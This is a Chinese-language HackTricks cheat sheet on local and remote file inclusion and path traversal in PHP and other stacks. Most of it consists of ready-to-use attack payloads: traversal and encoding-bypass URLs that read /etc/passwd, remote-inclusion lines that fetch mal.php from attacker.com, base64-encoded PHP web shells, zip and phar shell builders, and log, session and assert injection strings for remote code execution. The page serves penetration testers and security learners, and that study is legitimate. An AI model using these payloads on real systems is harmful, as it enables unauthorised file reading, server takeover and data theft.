# 文件包含/路径遍历

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为英雄，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客洞察**\
参与深入探讨黑客攻击的刺激和挑战的内容

**实时黑客新闻**\
通过实时新闻和洞察，跟上快节奏的黑客世界

**最新公告**\
通过最新的漏洞赏金发布和关键平台更新，保持信息的更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 并开始与顶尖黑客合作！

## 文件包含

**远程文件包含 (RFI)：** 文件从远程服务器加载（最佳：你可以编写代码，服务器将执行它）。在php中，默认情况下是**禁用**的（**allow\_url\_include**）。\
**本地文件包含 (LFI)：** 服务器加载本地文件。

当用户能够以某种方式控制服务器即将加载的文件时，就会发生漏洞。

易受攻击的**PHP函数**：require, require\_once, include, include\_once

一个有趣的工具来利用这个漏洞：[https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## 盲目 - 有趣 - LFI2RCE文件
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**将几个不同的 \*nix LFI 列表混合并添加了更多路径，我创建了以下这个列表：**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

尝试将 `/` 更改为 `\`\
也尝试添加 `../../../../../`

一个使用多种技术来查找文件 /etc/password（以检查漏洞是否存在）的列表可以在[这里](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)找到

### **Windows**

合并了几个列表后，我创建了：

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

尝试将 `/` 更改为 `\`\
也尝试移除 `C:/` 并添加 `../../../../../`

一个使用多种技术来查找文件 /boot.ini（以检查漏洞是否存在）的列表可以在[这里](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)找到

### **OS X**

检查 Linux 的 LFI 列表。

## 基础 LFI 及其绕过

所有示例都适用于本地文件包含，但也可以应用于远程文件包含（例如 page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/）。
```
http://example.com/index.php?page=../../../etc/passwd
```
### 遍历序列非递归地被剥离
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **空字节 (%00)**

绕过在提供的字符串末尾附加更多字符（绕过：$\_GET\['param']."php"）
```
http://example.com/index.php?page=../../../etc/passwd%00
```
这个问题在 **PHP 5.4** 已经得到解决

### **编码**

你可以使用非标准编码，比如双重URL编码（以及其他）：
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 来自现有文件夹

后端可能正在检查文件夹路径：
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### 识别服务器上的文件夹

根据应用程序代码/允许的字符，可能可以通过发现文件夹而不仅仅是文件来递归地探索文件系统。为此：

* 通过成功检索 `/etc/passwd`（如果在Linux上）来确定当前目录的“深度”：
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* 尝试通过添加文件夹名称（此处为 `private`），然后返回到 `/etc/passwd` 来猜测当前目录中的文件夹名称：
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* 如果应用程序存在漏洞，可能会有两种不同的请求结果：
* 如果你收到一个错误/没有输出，那么`private`文件夹在这个位置不存在
* 如果你得到了`/etc/passwd`的内容，你就验证了当前目录确实存在一个`private`文件夹
* 使用这种技术发现的文件夹可以进一步使用经典的LFI方法对文件进行模糊测试，或者使用相同的技术递归地对子目录进行模糊测试。

可以调整这种技术，以在文件系统的任何位置找到目录。例如，如果在相同的假设下（当前目录在文件系统的第三层），你想检查`/var/www/`是否包含一个`private`目录，使用以下payload：
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
以下命令序列允许使用 `sed` (1) 生成有效载荷，作为URL模糊测试工具如 `ffuf` (2) 的输入：
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
$ ffuf -u http://owasp.ctf.intigriti.io/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -e '.php~,.php.old,.php.bak,.php.swp,.php.sav,.php.save'
```
当然，根据您的需求调整这些有效载荷，以适应深度/位置/输入目录列表。

### **路径截断**

绕过在提供的字符串末尾附加更多字符的限制（绕过：$\_GET\['param']."php"）
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
始终尝试**从假目录**（a/）**开始**路径。

**此漏洞在PHP 5.3中得到修正。**

### **过滤器绕过技巧**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## 远程文件包含

在php中，这是默认禁用的，因为 **`allow_url_include`** 是**关闭的**。它必须是**开启的**才能工作，在那种情况下，你可以包含来自你服务器的PHP文件并获得RCE：
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
如果出于某种原因 **`allow_url_include`** 是 **开启** 的，但PHP正在**过滤**对外部网页的访问，[根据这篇文章](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)，你可以使用数据协议与base64来解码b64 PHP代码并获得RCE：

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
在上面的代码中，最后添加了 `+.txt` 是因为攻击者需要一个以 `.txt` 结尾的字符串，所以字符串以它结束，在 b64 解码后那部分将返回无用信息，而真正的 PHP 代码将被包含（因此，被执行）。
{% endhint %}

另一个**不使用 `php://` 协议**的例子是：

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python 根元素

在 Python 中，像这样的代码：
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
如果用户传递了一个**绝对路径**到 **`file_name`**，**之前的路径将被移除**：
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
```markdown
根据[官方文档](https://docs.python.org/3.10/library/os.path.html#os.path.join)所述，这是预期的行为：

> 如果组件是一个绝对路径，那么所有之前的组件都会被丢弃，连接操作将从绝对路径组件开始。

## Java 列出目录

看起来如果你在 Java 中遇到路径遍历，并且你**请求目录**而不是文件，会返回**目录列表**。据我所知，其他语言不会发生这种情况。

## 前25个参数

以下是可能容易受到本地文件包含（LFI）漏洞影响的前25个参数列表（来源于[链接](https://twitter.com/trbughunters/status/1279768631845494787)）：
```
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI 使用 PHP 包装器和协议

### php://filter

PHP 过滤器允许在数据被读取或写入之前执行基本的**修改操作**。有 5 类过滤器：

* [字符串过滤器](https://www.php.net/manual/en/filters.string.php)：
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`：从数据中移除标签（"<" 和 ">" 字符之间的所有内容）
* 注意这个过滤器在 PHP 的现代版本中已经消失
* [转换过滤器](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` ：转换为不同的编码（`convert.iconv.<input_enc>.<output_enc>`）。要获取**所有支持的编码列表**，在控制台运行：`iconv -l`

{% hint style="warning" %}
滥用 `convert.iconv.*` 转换过滤器，你可以**生成任意文本**，这可能有助于写入任意文本或使像 include 这样的函数处理任意文本。更多信息请查看 [**LFI2RCE 通过 php 过滤器**](lfi2rce-via-php-filters.md)。
{% endhint %}

* [压缩过滤器](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`：压缩内容（如果泄露大量信息时很有用）
* `zlib.inflate`：解压数据
* [加密过滤器](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` ：已弃用
* `mdecrypt.*` ：已弃用
* 其他过滤器
* 在 php 中运行 `var_dump(stream_get_filters());` 可以找到一些**意外的过滤器**：
* `consumed`
* `dechunk`：逆转 HTTP 分块编码
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
部分 "php://filter" 对大小写不敏感
{% endhint %}

### php://fd

此封装器允许访问进程已打开的文件描述符。可能用于泄露已打开文件的内容：
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
你也可以使用 **php://stdin, php://stdout 和 php://stderr** 来分别访问 **文件描述符 0, 1 和 2**（不确定这在攻击中如何有用）

### zip:// 和 rar://

上传一个包含 PHPShell 的 Zip 或 Rar 文件并访问它。\
为了能够滥用 rar 协议，它**需要被特别激活**。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
```markdown
趣事：您可以通过以下方式触发 XSS 并绕过 Chrome Auditor： `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

请注意，此协议受 php 配置 **`allow_url_open`** 和 **`allow_url_include`** 的限制

### expect://

Expect 必须被激活。您可以使用这个执行代码。
```
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### 输入：

在POST参数中指定你的有效载荷
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

`.phar` 文件也可以用来执行 PHP 代码，如果网站使用了像 `include` 这样的函数来加载文件的话。

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
```
{% endcode %}

您可以执行以下命令来编译`phar`：
```
```bash
php --define phar.readonly=0 create_path.php
```
将生成一个名为 `test.phar` 的文件，您可以使用它来滥用 LFI。

如果 LFI 只是读取文件而不执行其中的 php 代码，例如使用函数 _**file\_get\_contents(), fopen(), file() 或 file\_exists(), md5\_file(), filemtime() 或 filesize()**_**。** 您可以尝试滥用在使用 **phar** 协议**读取**文件时发生的**反序列化**。\
有关更多信息，请阅读以下帖子：

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### 更多协议

查看更多可能的[**包含这里的协议**](https://www.php.net/manual/en/wrappers.php)**：**

* [php://memory 和 php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — 在内存或临时文件中写入（不确定这在文件包含攻击中如何有用）
* [file://](https://www.php.net/manual/en/wrappers.file.php) — 访问本地文件系统
* [http://](https://www.php.net/manual/en/wrappers.http.php) — 访问 HTTP(s) URLs
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — 访问 FTP(s) URLs
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 压缩流
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — 查找匹配模式的路径名（它不返回任何可打印的内容，所以这里不真正有用）
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — 安全外壳协议 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — 音频流（不适用于读取任意文件）

## 通过 PHP 的 'assert' 实现 LFI

如果您遇到一个难以处理的 LFI，它似乎在过滤像 ".." 这样的遍历字符串，并以 "Hacking attempt" 或 "Nice try!" 之类的回应，一个 'assert' 注入有效载荷可能会起作用。

像这样的有效载荷：
```
' and die(show_source('/etc/passwd')) or '
```
将成功利用看起来像这样的“file”参数的PHP代码：
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
```markdown
也有可能在一个易受攻击的 "assert" 语句中使用 system() 函数来获得 RCE：
```
```
' and die(system("whoami")) or '
```
确保在发送前对有效载荷进行URL编码。

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客洞察**\
参与深入探讨黑客挑战和刺激的内容

**实时黑客新闻**\
通过实时新闻和洞察，跟上快节奏的黑客世界

**最新公告**\
通过最新的漏洞赏金发布和关键平台更新，保持信息的更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **，今天就开始与顶尖黑客合作！**

## PHP 盲目路径遍历

{% hint style="warning" %}
当你**控制**一个**PHP函数**的**文件路径**，该函数将**访问一个文件**，但你看不到文件内容（如简单的调用**`file()`**）时，此技术相关。但内容不会显示。
{% endhint %}

在[**这篇不可思议的文章**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)中，解释了如何通过PHP过滤器滥用盲目路径遍历，通过错误预言机**泄露文件内容**。

总结来说，技术使用**"UCS-4LE" 编码**使文件内容变得非常**大**，以至于**打开**文件的**PHP函数**会触发一个**错误**。

然后，为了泄露第一个字符，使用过滤器**`dechunk`**以及其他过滤器如**base64**或**rot13**，最后使用过滤器**convert.iconv.UCS-4.UCS-4LE**和**convert.iconv.UTF16.UTF-16BE**将其他字符**放在开头并泄露它们**。

**可能存在漏洞的函数**：`file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

有关技术细节，请查看上述文章！

## LFI2RCE

### 远程文件包含

如前所述，[**请点击此链接**](./#remote-file-inclusion)。

### 通过 Apache/Nginx 日志文件

如果 Apache 或 Nginx 服务器在 include 函数中**容易受到 LFI 的影响**，你可以尝试访问**`/var/log/apache2/access.log` 或 `/var/log/nginx/access.log`**，在**用户代理**中或在**GET 参数**中设置一个php shell，如 **`<?php system($_GET['c']); ?>`** 并包含该文件

{% hint style="warning" %}
请注意，如果你使用**双引号**而不是**单引号**来写 shell，双引号将被修改为字符串 "_**quote;**_"，**PHP 将抛出错误**，**不会执行其他任何操作**。

此外，确保你**正确编写有效载荷**，否则 PHP 在尝试加载日志文件时每次都会出错，你将没有第二次机会。
{% endhint %}

这也可以在其他日志中完成，但要**小心**，日志中的代码可能是URL编码的，这可能会破坏 Shell。头部**授权 "basic"** 包含 Base64 编码的 "user:password"，并在日志中解码。PHPShell 可以插入到此头部中。\
其他可能的日志路径：
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing 字典: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### 通过电子邮件

**发送邮件**到内部账户（user@localhost），邮件中包含你的PHP有效载荷，如 `<?php echo system($_REQUEST["cmd"]); ?>`，然后尝试包含用户的邮件，路径类似 **`/var/mail/<USERNAME>`** 或 **`/var/spool/mail/<USERNAME>`**

### 通过 /proc/\*/fd/\*

1. 上传大量的shell（例如：100个）
2. 包含 [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)，其中 $PID = 进程的PID（可以暴力破解），$FD 是文件描述符（也可以暴力破解）

### 通过 /proc/self/environ

像日志文件一样，发送有效载荷在User-Agent中，它会被反映在 /proc/self/environ 文件内
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### 通过上传

如果您可以上传文件，只需在其中注入shell载荷（例如：`<?php system($_GET['c']); ?>`）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
为了保持文件的可读性，最好将代码注入到图片/doc/pdf的元数据中

### 通过Zip文件上传

上传一个包含PHP shell的ZIP文件，并访问：
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### 通过 PHP 会话

检查网站是否使用 PHP 会话（PHPSESSID）
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
在PHP中，这些会话被存储在 _/var/lib/php5/sess\\_\[PHPSESSID]\_ 文件中
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
将 cookie 设置为 `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
使用LFI包含PHP会话文件
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### 通过 ssh

如果 ssh 活跃，检查正在使用的用户（/proc/self/status 和 /etc/passwd），并尝试访问 **\<HOME>/.ssh/id\_rsa**

### **通过** **vsftpd** _**日志**_

这个 FTP 服务器的日志存储在 _**/var/log/vsftpd.log**_ 中。如果你有一个 LFI 并且可以访问一个暴露的 vsftpd 服务器，你可以尝试登录，将 PHP 负载设置在用户名中，然后使用 LFI 访问日志。

### 通过 php base64 过滤器（使用 base64）

如[本文](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64)所示，PHP base64 过滤器只忽略非 base64。你可以利用这一点绕过文件扩展名检查：如果你提供以 ".php" 结尾的 base64，它会忽略 "." 并将 "php" 附加到 base64 后面。这里有一个示例负载：
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### 通过php过滤器（无需文件）

这篇[**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)解释了你可以使用**php过滤器生成任意内容**作为输出。这基本上意味着你可以**生成任意php代码**用于include**无需写入**文件。

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### 通过段错误

**上传**一个文件，它将作为**临时文件**存储在`/tmp`中，然后在**同一个请求中**，触发一个**段错误**，之后**临时文件将不会被删除**，你可以搜索这个文件。

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### 通过Nginx临时文件存储

如果你发现了一个**本地文件包含**并且**Nginx**在PHP前运行，你可能可以使用以下技术获得RCE：

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### 通过PHP\_SESSION\_UPLOAD\_PROGRESS

即使你**没有会话**并且`session.auto_start`是`Off`，如果你在**multipart POST**数据中提供了**`PHP_SESSION_UPLOAD_PROGRESS`**，PHP将**为你启用会话**。你可以利用这个获得RCE：

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### 通过Windows中的临时文件上传

如果你发现了一个**本地文件包含**并且服务器运行在**Windows**上，你可能获得RCE：

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### 通过phpinfo() (file\_uploads = on)

如果你发现了一个**本地文件包含**并且一个文件暴露了**phpinfo()**且file\_uploads = on，你可以获得RCE：

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### 通过compress.zlib + `PHP_STREAM_PREFER_STUDIO` + 路径泄露

如果你发现了一个**本地文件包含**并且你**可以泄露临时文件的路径**，但是**服务器**正在**检查**是否**要包含的文件有PHP标记**，你可以尝试用这个**竞态条件**来**绕过检查**：

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### 通过永久等待 + 暴力破解

如果你可以滥用LFI来**上传临时文件**并让服务器**挂起**PHP执行，你可以在几个小时内**暴力破解文件名**来找到临时文件：

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### 致命错误

如果你包含了以下任何文件`/usr/bin/phar`、`/usr/bin/phar7`、`/usr/bin/phar.phar7`、`/usr/bin/phar.phar`。（你需要包含同一个文件两次来引发该错误）。

**我不知道这有什么用，但它可能有用。**\
即使你引起了PHP致命错误，PHP临时上传的文件也会被删除。

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## 参考资料

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

加入[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)服务器，与经验丰富的黑客和漏洞赏金猎人交流！

**黑客洞察**\
深入探讨黑客的刺激和挑战

**实时黑客新闻**\
通过实时新闻和洞察，跟上快节奏的黑客世界

**最新公告**\
通过最新的漏洞赏金发布和关键平台更新，保持信息更新

**加入我们的** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 并开始与顶尖黑客合作！

<details>

<summary><strong>从零开始学习AWS黑客攻击到高手，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
